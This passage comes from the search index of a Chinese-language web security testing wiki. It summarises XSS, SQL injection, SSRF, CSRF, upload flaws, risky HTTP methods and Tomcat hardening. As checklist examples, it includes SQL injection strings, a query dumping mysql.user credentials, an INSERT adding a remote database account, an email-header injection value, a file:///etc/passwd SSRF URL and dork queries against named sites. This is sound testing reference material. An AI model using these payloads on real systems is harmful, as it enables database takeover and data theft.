2\u3001\u7f51\u7ad9\u6302\u9a6c\uff1a\u8de8\u7ad9\u65f6\u5229\u7528IFrame\u5d4c\u5165\u9690\u85cf\u7684\u6076\u610f\u7f51\u7ad9\u6216\u8005\u5c06\u88ab\u653b\u51fb\u8005\u5b9a\u5411\u5230\u6076\u610f\u7f51\u7ad9\u4e0a\uff0c\u6216\u8005\u5f39\u51fa\u6076\u610f\u7f51\u7ad9\u7a97\u53e3\u7b49\u65b9\u5f0f\u90fd\u53ef\u4ee5\u8fdb\u884c\u6302\u9a6c\u653b\u51fb\u3002 3\u3001\u8eab\u4efd\u76d7\u7528\uff1aCookie\u662f\u7528\u6237\u5bf9\u4e8e\u7279\u5b9a\u7f51\u7ad9\u7684\u8eab\u4efd\u9a8c\u8bc1\u6807\u5fd7\uff0cXSS\u53ef\u4ee5\u76d7\u53d6\u5230\u7528\u6237\u7684Cookie\uff0c\u4ece\u800c\u5229\u7528\u8be5Cookie\u76d7\u53d6\u7528\u6237\u5bf9\u8be5\u7f51\u7ad9\u7684\u64cd\u4f5c\u6743\u9650\u3002\u5982\u679c\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\u7528\u6237Cookie\u88ab\u7a83\u53d6\uff0c\u5c06\u4f1a\u5bf9\u7f51\u7ad9\u5f15\u53d1\u5de8\u5927\u7684\u5371\u5bb3\u3002 4\u3001\u76d7\u53d6\u7f51\u7ad9\u7528\u6237\u4fe1\u606f\uff1a\u5f53\u80fd\u591f\u7a83\u53d6\u5230\u7528\u6237Cookie\u4ece\u800c\u83b7\u53d6\u5230\u7528\u6237\u8eab\u4efd\u4f7f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u5230\u7528\u6237\u5bf9\u7f51\u7ad9\u7684\u64cd\u4f5c\u6743\u9650\uff0c\u4ece\u800c\u67e5\u770b\u7528\u6237\u9690\u79c1\u4fe1\u606f\u3002 5\u3001\u5783\u573e\u4fe1\u606f\u53d1\u9001\uff1a\u6bd4\u5982\u5728SNS\u793e\u533a\u4e2d\uff0c\u5229\u7528XSS\u6f0f\u6d1e\u501f\u7528\u88ab\u653b\u51fb\u8005\u7684\u8eab\u4efd\u53d1\u9001\u5927\u91cf\u7684\u5783\u573e\u4fe1\u606f\u7ed9\u7279\u5b9a\u7684\u76ee\u6807\u7fa4\u3002 6\u3001\u52ab\u6301\u7528\u6237Web\u884c\u4e3a\uff1a\u4e00\u4e9b\u9ad8\u7ea7\u7684XSS\u653b\u51fb\u751a\u81f3\u53ef\u4ee5\u52ab\u6301\u7528\u6237\u7684Web\u884c\u4e3a\uff0c\u76d1\u89c6\u7528\u6237\u7684\u6d4f\u89c8\u5386\u53f2\uff0c\u53d1\u9001\u4e0e\u63a5\u6536\u7684\u6570\u636e\u7b49\u7b49\u3002 7\u3001XSS\u8815\u866b\uff1aXSS \u8815\u866b\u53ef\u4ee5\u7528\u6765\u6253\u5e7f\u544a\u3001\u5237\u6d41\u91cf\u3001\u6302\u9a6c\u3001\u6076\u4f5c\u5267\u3001\u7834\u574f\u7f51\u4e0a\u6570\u636e\u3001\u5b9e\u65bdDDoS\u653b\u51fb\u7b49\u3002 \u53c2\u8003\uff1a https://help.aliyun.com/knowledge_detail/37444.html?spm=5176.7837442.2.11.F8ceHg http://blog.csdn.net/change518/article/details/51024706 \u9690\u85cf\u57dfXSS\uff08\u501f\u52a9accesskey\u5c5e\u6027\uff09","title":"5.2.8.1. *XSS\uff08\u8de8\u7ad9\u70b9\u811a\u672c\u653b\u51fb\uff09*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5282-sql","text":"(1\u3001java\u9884\u5904\u7406preparestatement\uff1b2\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u8fc7\u6ee4\u53c2\u6570\uff1b3\u3001\u4e25\u683c\u5b57\u7b26\u4e32\u8fc7\u6ee4\uff1b4\u3001\u53c2\u6570\u5316\u7684sql) \u4f8b\u5b50\uff1a\u53c2\u6570date=if(now()=sysdate(),sleep(0),0)/ 'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\" / Sql\u8bed\u53e5\u4e2d\u7684/\u659c\u6760\uff1a\u8868\u793a\u6267\u884c\uff0c\u628a\u4e4b\u524d\u65f6\u95f4\u5185\u7684\u7f13\u5b58\u4e2d\u7684\u8bed\u53e5\u518d\u6267\u884c\u4e00\u904d \u200b \\\u659c\u6760\uff1a\u8868\u793a\u8bed\u53e5\u672a\u5b8c\u6362\u884c \u5355\u884c\u6ce8\u91ca\uff1a-- \u591a\u884c\u6ce8\u91ca\uff1a/* */ If(now()=sysdate(),sleep(2),0)\u8868\u793a\u5982\u679cnow()=sysdate(),\u4e3a\u771f\u6267\u884csleep(2),\u5426\u5219\u6267\u884c0 \u5f53\u524d\u5f62\u52bf\u4e0b\uff0c\u65b0\u5f00\u53d1\u7684\u7f51\u7ad9\uff0c\u5927\u90e8\u5206\u91c7\u7528\u65b0\u6846\u67b6\u90fd\u5df2\u7ecf\u53ef\u4ee5\u9884\u9632sql\u6ce8\u5165\u4e86\uff0c\u53ea\u6709\u624b\u52a8\u62fc\u63a5\u7684sql\u8bed\u53e5\u6613\u88absql\u6ce8\u5165\u3002 \u751f\u6210\u6ce8\u5165\u7528\u4f8b\u65f6\u6ce8\u610f\uff1a 1\uff09\u2019 \u5355\u5f15\u53f7\u95ed\u5408 2\uff09\u2018OR \u5355\u5f15\u53f7\u4e5f\u53ef\u4ee5\u6709\u7ed3\u675f\u5f00\u59cb\u4e0b\u4e00\u5143\u7d20\u7684\u6548\u679c 3\uff09-- - \u6ce8\u91ca\u540e\u9762\u8ddf\u7a7a\u683c\u5b9e\u73b0\u6ce8\u91ca\u4e0d\u8ddf\u540e\u9762\u8bed\u53e5\u8fde\u63a5\uff0c\u540e\u9762\u5b9e\u9645\u88ab\u6ce8\u91ca\u6389\u6548\u679c 4\uff09Select CONCAT_WS(0x3A, USER, PASSWORD) FROM mysql.user \u83b7\u53d6\u6570\u636e\u5e93\u7528\u6237 5\uff09union all \u8fde\u63a5\u4e24\u4e2aselect\u67e5\u8be2\u7ed3\u679c\uff0c\u5408union\u7684\u533a\u522b\u4e0d\u53bb\u91cd\u590d\uff1b\u4e24\u4e2aselect\u67e5\u8be2\u7684\u5b57\u6bb5\u4e00\u6837 6\uff09insert into mysql.user(Host,User,Password) values(\"%\",\"Sectest\",password(\"111111\")) \u7ed9\u6570\u636e\u5e93\u6dfb\u52a0\u7528\u6237 %\uff1a\u8fdc\u7a0b\u7528\u6237\uff0clocalhost\uff1a\u672c\u5730\u7528\u6237 \u7cfb\u7edf\u4f7f\u7528\u4e86MyBatis\u52a8\u6001SQL\u6846\u67b6\u7ec4\u88c5sql\uff0c\u6ce8\u610f\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 \u548c#\u7684\u4f7f\u7528\uff0c\u4f7f\u7528 \u548c#\u7684\u4f7f\u7528\uff0c\u4f7f\u7528 \u53ef\u80fd\u5bfc\u81f4sql\u6ce8\u5165 \u62fc\u63a5\u540e\u7684\u8bed\u53e5\u518d\u653e\u5165\u9884\u7f16\u8bd1\u5bf9\u8c61\u662f\u5f92\u52b3\u7684\uff0c\u56e0\u4e3a\u5728\u9884\u7f16\u8bd1\u4e4b\u524d\u62fc\u63a5\u7684SQL\u8bed\u53e5\u6267\u884c\u903b\u8f91\u5df2\u7ecf\u88ab\u7834\u574f\uff0c\u539f SQL\u8bed\u53e5\u7684\u672c\u610f\u5df2\u7ecf\u88ab\u6539\u53d8\u4e86\u3002 \u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37450.html?spm=5176.7837442.2.10.ZotsLv Sql\u6ce8\u5165\u5e38\u7528\u8bed\u53e5\uff1a http://www.111cn.net/database/mysql/58518.htm http://wenku.baidu.com/link?url=sK_daSqJFJt3KsCuYQOjCkuGldDJSJQbATiRX42UEocanxFejYSjVESnyHPhvDP___hGAbKSLMhh4020TOP9wItRr1YWiq8OQ1HzYItXc6q","title":"5.2.8.2. *SQL\u6ce8\u5165*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5283-xml","text":"\uff08\u501f\u52a9XXE,\u653b\u51fb\u8005\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6,DOS\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u4ee5\u53ca\u4ee3\u7406\u626b\u63cf\u5185\u7f51\u7b49\uff09 \u65e5\u5fd7\u6ce8\u5165\uff08\\r,\\n\u6362\u884c\uff0c\u4f2a\u9020\u65e5\u5fd7\uff09 \u547d\u4ee4\u6ce8\u5165\uff08\u64cd\u7eb5\u7cfb\u7edf\u547d\u4ee4\uff09 Email Header Injection(\u90ae\u4ef6\u6807\u5934\u6ce8\u5165) /*\uff08\u6211\u4eec\u5728\u6682\u65f6\u4e0d\u6d89\u53ca\uff09 Email Header Injection\uff1a\u5982\u679c\u8868\u5355\u7528\u4e8e\u53d1\u9001email,\u8868\u5355\u4e2d\u53ef\u80fd\u5305\u62ec\u201csubject\u201d\u8f93\u5165\u9879\uff08\u90ae\u4ef6\u6807\u9898\uff09\uff0c\u6211\u4eec\u8981\u9a8c\u8bc1subject\u4e2d\u5e94\u80fdescape\u6389\u201c\\n\u201d\u6807\u8bc6\u3002 \u56e0\u4e3a\u201c\\n\u201d\u662f\u65b0\u884c\uff0c\u5982\u679c\u5728subject\u4e2d\u8f93\u5165\u201chello\\ncc: spamvictim@example.com \u201d\uff0c\u53ef\u80fd\u4f1a\u5f62\u6210\u4ee5\u4e0b Subject: hello cc: spamvictim@example.com \u5982\u679c\u5141\u8bb8\u7528\u6237\u4f7f\u7528\u8fd9\u6837\u7684subject\uff0c\u90a3\u4ed6\u53ef\u80fd\u4f1a\u7ed9\u5229\u7528\u8fd9\u4e2a\u7f3a\u9677\u901a\u8fc7\u6211\u4eec\u7684\u5e73\u53f0\u7ed9\u5176\u5b83\u7528\u6237\u53d1\u9001\u5783\u573e\u90ae\u4ef6\u3002 */","title":"5.2.8.3. *XML\u6ce8\u5165\u6d4b\u8bd5*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5284","text":"\u4ee3\u7801\u6267\u884c\u662f\u6307\u5e94\u7528\u7a0b\u5e8f\u5bf9\u4f20\u5165\u547d\u4ee4\u7684\u53c2\u6570\u8fc7\u6ee4\u4e0d\u4e25\u5bfc\u81f4\u6076\u610f\u7528\u6237\u80fd\u63a7\u5236\u6700\u7ec8\u6267\u884c\u7684\u547d\u4ee4\uff0c\u8fdb\u800c\u5165\u4fb5\u7cfb\u7edf\uff0c\u5bfc\u81f4\u4e25\u91cd\u7834\u574f\u7684\u9ad8\u5371\u6f0f\u6d1e\u3002 https://help.aliyun.com/knowledge_detail/37446.html?spm=5176.7837442.2.2.nCzE5s","title":"5.2.8.4. *\u4ee3\u7801\u6267\u884c*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5285-crlf","text":"CRLF\uff0ccarriage-return-line-feed,\u56de\u8f66\u6362\u884c\u6f0f\u6d1e\u3002 \u6848\u4f8b\u53c2\u8003\uff1a https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html \uff08\u5bf9header\u8fdb\u884c\u6ce8\u5165\uff09 \u200b","title":"5.2.8.5. *CRLF\u6f0f\u6d1e*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#529","text":"\u8de8\u76ee\u5f55\u6587\u4ef6\u4e0b\u8f7d \u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u540e\u7f00\uff09 \u4efb\u610f\u76ee\u5f55\u6587\u4ef6\u4e0a\u4f20\uff08\u76ee\u5f55\uff09 \u8d85\u5927\u6587\u4ef6\u4e0a\u4f20\uff08\u5927\u5c0f\uff09 \u4e0a\u4f20\u6587\u4ef6\u5e9f\u5f03\u540e\u5904\u7406\uff08\u5806\u79ef\uff09 \u4e0a\u4f20\u6587\u4ef6\u540dxss\uff08\u91cd\u547d\u540d\uff09 \u4e0a\u4f20\u6587\u4ef6\u540d\u622a\u65ad\uff080x00\u6216\u80050x58,burp\u4e5f\u53ef\u4ee5\u4fee\u6539\u4e8c\u8fdb\u5236\uff0curl\u4e2d%00\uff09 \u4e0a\u4f20\u6587\u4ef6\u6743\u9650\u9650\u5236 \u538b\u7f29\u70b8\u5f39 Include\u5305\u542b\u4e0a\u4f20\uff08shtml\uff09 \u4e0a\u4f20zip\u6587\u4ef6\u540d\u4e2d\u5305\u542b../ \u672c\u5730\u6587\u4ef6\u5305\u542b\u7684\u6982\u5ff5\uff1a https://help.aliyun.com/knowledge_detail/37472.html?spm=5176.7837442.2.2.2NdNhY","title":"5.2.9. *\u4e0a\u4f20\u4e0b\u8f7d*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5210-csrf","text":"CSRF\u3010cross site request forgery\u3011\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020\u3002 \u539f\u7406\uff1a\u5229\u7528\u6d4f\u89c8\u5668\u5185\u5b58\u5171\u4eab\u539f\u7406\uff0c\u5229\u7528\u7528\u6237\u8eab\u4efd\u4f2a\u9020\u7528\u6237\u52a8\u4f5c\u53d1\u9001\u5230\u670d\u52a1\u7aef\u3002\uff08\u4ece\u6076\u610f\u7ad9\u70b9\u6a21\u62df\u7528\u6237\u53d1\u9001\u6b63\u5e38\u7684\u8bf7\u6c42\u643a\u5e26cookie\uff0c\u89c17.1\uff09","title":"5.2.10. *CSRF*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52101-url","text":"\uff08\u53c2\u8003http://drops.wooyun.org/papers/154\uff09 1\u3001\u95ee\u9898\u70b9 \u5728\u9875\u9762\u8df3\u8f6c\u7684\u5730\u65b9\uff0cURL\u4e2d\u5305\u542b\u53e6\u5916\u7684\u7f51\u5740\uff0c\u4f8b\u5982\uff1a \u7b2c\u4e00\u7c7b \u7b80\u5355URL\u8fc7\u6ee4 www.xxx.com?a=http://www.yyy.com \u7b2c\u4e8c\u7c7b \u5e95\u5c42\u64cd\u4f5c\u7c7b\u5e93\u652f\u6301\u5176\u4ed6\u534f\u8bae\u5bfc\u81f4\u8bfb\u53d6\u672c\u5730\u6216\u63a2\u6d4b\u7f51\u7edc\u4fe1\u606f http://h2w.iask.cn/h5.php?u=file:///etc/passwd \u7531\u4e8e\u5e95\u5c42\u9002\u7528\u7c7bcurl\u5e93,\u800c\u6ca1\u6709\u6b63\u786e\u8fc7\u6ee4URL\u5bfc\u81f4\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5185\u7f51\u8bf8\u591a\u4fe1\u606f.\u8fd8\u6709\u5176\u4ed6\u7c7b\u4f3c\u7684\u5f62\u5f0f\uff1a \u5982file://, ftp://, telnet://\u7b49 \u7b2c\u4e09\u7c7b \u4e0d\u652f\u6301\u5176\u4ed6\u534f\u8bae\u4f46\u662f\u6ca1\u6709\u8bbe\u7f6e\u7f51\u7edc\u8fb9\u754c\uff08SSRF\u6f0f\u6d1e\u7684\u59ff\u52bf\u554a\uff09 http://wap.sogou.com/tc?url=http%3A%2F%2Fno.sohu.com%2F \u4f7f\u7528\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\uff0c\u7a81\u7834\u5230\u7cfb\u7edf\u7684\u5185\u7f51 2\u3001\u5206\u6790 \u7406\u8bba\u4e0a\u8bb2\uff0curl\u8df3\u8f6c\u5c5e\u4e8eCSRF\u7684\u4e00\u79cd\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u4f20\u5165\u7684URL\u505a\u6709\u6548\u6027\u7684\u8ba4\u8bc1\uff0c\u4fdd\u8bc1\u8be5URL\u6765\u81ea\u4e8e\u6b63\u786e\u7684\u5730\u65b9\uff0c\u9650\u5236\u7684\u65b9\u5f0f\u540c\u9632\u6b62csrf\u4e00\u6837\u53ef\u4ee5\u5305\u62ec\uff1a 1\uff09referer\u7684\u9650\u5236 2\uff09\u52a0\u5165\u6709\u6548\u6027\u9a8c\u8bc1Token 3\u3001\u5bf9\u8df3\u8f6c\u7684\u5730\u5740\u6ca1\u6709\u505a\u4e25\u683c\u7684\u6821\u9a8c","title":"5.2.10.1. *URL\u91cd\u5b9a\u5411\uff08\u8df3\u8f6c\uff09\u6f0f\u6d1e\uff1a*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5211-cors","text":"CORS\u3010cross origin resouse-sharing\u3011\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u3002 \u5de5\u5177\uff1ashell of the future \u7406\u89e3\u53c2\u8003\uff1a http://www.2cto.com/Article/201209/154081.html","title":"5.2.11. *CORS\u6f0f\u6d1e*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5212-ssrf","text":"\u884c\u4e3a\u7279\u70b9\uff1a\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u8d44\u6e90\u7684\u529f\u80fd\uff0c\u5e76\u4e14\u6b64\u529f\u80fd\u83b7\u53d6\u8d44\u6e90\u7684\u8bf7\u6c42\u662f\u4ece\u670d\u52a1\u7aef\u53d1\u8d77\u7684\u3002 \u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff1a \u53ef\u4ee5\u5bf9\u670d\u52a1\u5668\u6240\u5728\u7684\u5185\u7f51\u3001\u672c\u5730\u7aef\u53e3\u8fdb\u884c\u626b\u63cf\u3001\u83b7\u53d6banner\u7b49 \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u8005\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09 \u5bf9\u5185\u7f51WEB\u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u7684\u65b9\u5f0f \u653b\u51fb\u5185\u7f51WEB\u670d\u52a1\u5668\uff0cget\u8bf7\u6c42\u65b9\u5f0f \u5229\u7528file\u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\uff1a\u4f8b\u5982http://192.168.1.119/pm/www/index.php?m=bug&f=view&bugID=4052 http://netsecurity.51cto.com/art/201312/424038.htm","title":"5.2.12. *SSRF\u6f0f\u6d1e*****\uff08\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09****"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5213-google","text":"1\u3001\u641c\u7d22\u7ad9\u70b9\u770b\u662f\u5426\u80fd\u53d1\u73b0\u654f\u611f\u7684\u4fe1\u606f\u6216\u4e0d\u8be5\u516c\u5e03\u7684\u4fe1\u606f \u641c\u7d22\u547d\u4ee4\uff0c\u4f8b\u5982\uff1a l site:yizhen.cn l site:yizhen.cn yizhen.cn:password l site:yizhen.cn inurl:session l site:yizhen inanchor:\u4fee\u6539\u5bc6\u7801 l cache\uff1a www.yizhen.cn \u53c2\u8003\uff1a http://www.cnblogs.com/xuanhun/p/3910134.html","title":"5.2.13. *Google\u9ed1\u5ba2*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5214","text":"http\u5f00\u653e\u65b9\u6cd5\u6d4b\u8bd5 \u4e0d\u5b89\u5168\u7684\u65b9\u6cd5\uff1aput\u3001delete\u3001trace\u3001connect TRACE: \u8fd9\u4e2a\u65b9\u6cd5\u7b80\u5355\u8fd4\u56de\u5ba2\u6237\u7aef\u53d1\u9001\u7ed9\u670d\u52a1\u5668\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4e3b\u8981\u7528\u4e8e\u8c03\u8bd5\u76ee\u7684\u3002\u8fd9\u4e2a\u65b9\u6cd5\u6700\u521d\u88ab\u8ba4\u4e3a\u6ca1\u6709\u5371\u5bb3\uff0c\u88abJermiah Grossman\u53d1\u73b0\u80fd\u88ab\u7528\u4e8e\u5b9e\u65bdXST CONNECT: \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u4f7f\u7528web\u670d\u52a1\u5668\u4f5c\u4e3a\u4ee3\u7406\u3002 DELETE: \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u5220\u9664web\u670d\u52a1\u5668\u4e0a\u7684\u4e00\u4e2a\u6587\u4ef6\u3002\u653b\u51fb\u8005\u80fd\u5229\u7528\u4ed6\u7b80\u5355\u76f4\u63a5\u7834\u574f\u7f51\u7ad9\u6216\u8005\u5b9e\u65bd\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002 \u8fd9\u4e2a\u65b9\u6cd5\u5141\u8bb8\u5ba2\u6237\u7aef\u5411web\u670d\u52a1\u5668\u4e0a\u4f20\u65b0\u7684\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u4ed6\u6765\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\uff08\u6bd4\u5982\u4e00\u4e2aasp\u6587\u4ef6\u901a\u8fc7\u8c03\u7528cmd.exe\u6765\u6267\u884c\u547d\u4ee4\uff09\uff0c\u6216\u8005\u7b80\u5355\u4f7f\u7528\u53d7\u5bb3\u8005\u670d\u52a1\u5668\u4f5c\u4e3a\u6587\u4ef6\u4ed3\u5e93\u3002 banner\u4fe1\u606f\u68c0\u67e5 HTTP\u65b9\u6cd5\u7be1\u6539(\u5df2\u9a8c\u8bc1\uff0c\u6ca1\u6709\u6b64\u95ee\u9898\uff1b\u95ee\u9898\u6848\u4f8bhttps:// www.sobug.com/article/detail/25 ) JavaScript DDOS\uff08\u5207\u6362https\u540e\u95ee\u9898\u89e3\u51b3\uff09 \u7f13\u51b2\u5668\u6ea2\u51fa\u6f0f\u6d1e\uff0cjava\u7684\u4e0d\u6d89\u53ca \u7ba1\u7406\u63a5\u53e3\u66b4\u529b\u679a\u4e3e\uff08DirBuster\uff09 \u6d4b\u8bd5HEAD\u8bbf\u95ee\u63a7\u5236\u7ed5\u8fc7 \u8de8\u57df\u7b56\u7565\u6d4b\u8bd5 \u6570\u503c\u6ea2\u51fa \u4e0d\u7ba1\u6574\u6570\uff0c\u6d6e\u70b9\u6570\uff0c\u957f\u6574\u6570\u7b49\u90fd\u662f\u6709\u4e00\u4e2a\u53ef\u4ee5\u8868\u793a\u7684\u6700\u5927\u503c\uff0c\u5982\u679c\u4e00\u4e2a\u8be5\u7c7b\u578b\u53d8\u91cf\u88ab\u8d4b\u4e88\u8d85\u8fc7\u5176\u6700\u5927\u503c\u7684\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0\u6ea2\u51fa\uff0c\u800c\u627e\u51fa\u8be5\u53d8\u91cf\u7684\u503c\u5f02\u5e38\u3002","title":"5.2.14. *\u5176\u4ed6*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5215","text":"\u91cd\u653e\u591a\u6b21\u8bf7\u6c42\u6d88\u8017\u7cfb\u7edf\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u9020\u6210dos\u3002\u7b5b\u9009\u51fa\u8f83\u4e3a\u6d88\u8017\u8d44\u6e90\u7684\u8bf7\u6c42\uff0c\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u6709\u9632\u91cd\u653e\u7b56\u7565\u6216\u8005\u673a\u5236\u3002","title":"5.2.15. *\u91cd\u653e\u653b\u51fb*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5216","text":"","title":"5.2.16. *\u5bb9\u5668\u7684\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52161-apache-tomcat","text":"1\uff09\u5b98\u7f51\u516c\u5e03\u7684\u5b89\u5168\u6f0f\u6d1e\u8865\u4e01\u5347\u7ea7 http://tomcat.apache.org/security-7.html#Apache_Tomcat_7.x_vulnerabilities 2\uff09\u8fd0\u884c\u8d26\u6237 \u5efa\u7acb\u72ec\u7acb\u7528\u6237\uff0c\u7528\u6237\u540d\u548c\u7ec4\u540d\u5747\u4e3atomcat\uff0c\u4e0d\u8bbe\u7f6e\u5bc6\u7801\uff08\u5373\u7981\u6b62SSH\u767b\u5f55\uff09\uff0ctomcat\u8fdb\u7a0b\u4ee5\u6b64\u5e10\u53f7\u8eab\u4efd\u8fd0\u884c\uff0c\u4e25\u7981\u4ee5root\u6743\u9650\u8fd0\u884ctomcat\uff0c\u7981\u6b62\u4ee5\u4e2a\u4eba\u5e10\u53f7\u6216\u5176\u4ed6\u6709shell\u6743\u9650\u7684\u5e10\u53f7\u8fd0\u884ctomcat\u3002 3\uff09\u5220\u9664Tomcat\u81ea\u5e26\u9879\u76ee 4\uff09\u68c0\u67e5tomcat\u5df2\u77e5\u7684\u5e26\u6709\u98ce\u9669\u7684\u914d\u7f6e a) \u7981\u7528\u5e94\u7528\u7a0b\u5e8f\u81ea\u52a8\u90e8\u7f72\u529f\u80fd\uff08\u5f85\u8003\u8651\uff09 b) \u7981\u7528webdav c) \u5b9a\u5236Tomcat\u51fa\u9519\u4fe1\u606f d) \u5173\u95edTomcat\u7684\u76ee\u5f55\u5217\u8868\u529f\u80fd e) \u9650\u5236http\u8bf7\u6c42\u7684\u6d88\u606f\u4e3b\u4f53\u7684\u5927\u5c0f f) \u7981\u6b62\u914d\u7f6eTomcat\u7684\u7f51\u7edc\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\u4e3a0\u6216-1 g) \u53ef\u6267\u884c\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539 h) \u914d\u7f6e\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539 i) \u65e5\u5fd7\u6587\u4ef6\u53ea\u80fd\u7531Tomcat\u5c5e\u4e3b\u7528\u6237\u4fee\u6539\u548c\u6267\u884c j) \u914d\u7f6e\u865a\u62df\u76ee\u5f55\uff0c\u7528\u4ee5\u9690\u85cf\u540e\u53f0\u8def\u5f84 k) \u7981\u7528SSI\u548cCGI\u529f\u80fd l) \u4e0d\u5141\u8bb8\u4f7f\u7528SetUID\u7a0b\u5e8f\uff0c\u5c24\u5176\u662froot\u8eab\u4efd\u7684SetUID\u7a0b\u5e8f m) \u5f00\u542fTomcat\u7684\u65e5\u5fd7\u529f\u80fd\uff1a\u6b63\u5e38\u7684\u8bbf\u95ee\u65e5\u5fd7\u548c\u9519\u8bef\u8bf7\u6c42\u65e5\u5fd7\u3002\u65e5\u5fd7\u6587\u4ef6\u7684\u8bb0\u5f55\u4e2d\u5305\u542b\u8bbf\u95ee\u65f6\u95f4\u3001\u5185\u5bb9\u3001\u7ed3\u679c\u53ca\u8bf7\u6c42\u7528\u6237\u7684ip\u7b49\u5173\u952e\u4fe1\u606f \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-1240 tomcat\u5730\u6743\u7528\u6237\u63d0\u6743\u6f0f\u6d1e\u3002\uff082016-10\uff09","title":"5.2.16.1. *Apache tomcat*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#5217","text":"","title":"5.2.17. *\u5176\u4ed6\u7ec4\u4ef6\u5b89\u5168*"},{"location":"%E5%AE%89%E5%85%A8wiki/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE%E6%A2%B3%E7%90%86/#52171-nginx","text":"\u5b98\u7f51\u5b89\u5168\u6f0f\u6d1e\u5148\u5173\u94fe\u63a5\uff1a http://nginx.org/en/security_advisories.html \u5f71\u54cd\u8f83\u5927\u7684\u6f0f\u6d1e\uff1a CVE-2016-1247 